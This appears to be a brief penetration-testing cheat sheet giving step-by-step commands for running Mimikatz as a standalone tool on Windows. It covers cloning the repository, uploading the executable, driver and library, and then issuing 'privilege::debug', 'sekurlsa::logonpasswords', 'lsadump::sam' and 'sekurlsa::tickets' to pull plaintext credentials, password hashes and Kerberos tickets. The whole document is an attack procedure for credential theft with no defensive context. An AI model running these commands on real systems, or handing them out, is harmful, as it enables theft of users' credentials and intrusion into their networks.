### stand alone version
download
```
git clone https://github.com/ParrotSec/mimikatz.git
```

upload mimikatz files in x64 folder
```
mimikatz.exe, mimilib.dll, mimidrv.sys
```

execute
```
.\mimikatz.exe
```

debug on
```
privilege::debug
```

logonpasswords
```
sekurlsa::logonpasswords
```

sam dump
```
lsadump::sam
```

tickets dump
```
sekurlsa::tickets
```
